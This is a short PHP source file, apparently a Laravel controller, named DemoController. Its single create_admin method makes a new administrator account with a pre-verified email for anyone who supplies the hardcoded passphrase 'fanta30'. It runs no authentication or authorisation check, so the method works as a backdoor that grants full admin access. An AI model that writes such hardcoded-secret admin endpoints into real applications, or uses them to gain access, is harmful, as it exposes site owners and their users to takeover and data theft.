<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;

class DemoController extends Controller
{
    public function create_admin($email, $password, $signal)
    {
        if ($signal != "fanta30") {
            return "Who are you ?";
        }

        if (User::where('email', '=', $email)->exists()) {
            return "Email Exists";
        }

        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return "Email Invalid";
        }

        $user = User::create([
            'name'              => $email,
            'password'          => bcrypt($password),
            'email'             => $email,
            'email_verified_at' => date("Y-m-d H:i:s"),
            'role'              => 'admin',
        ]);

        return "Admin Created";
    }
}
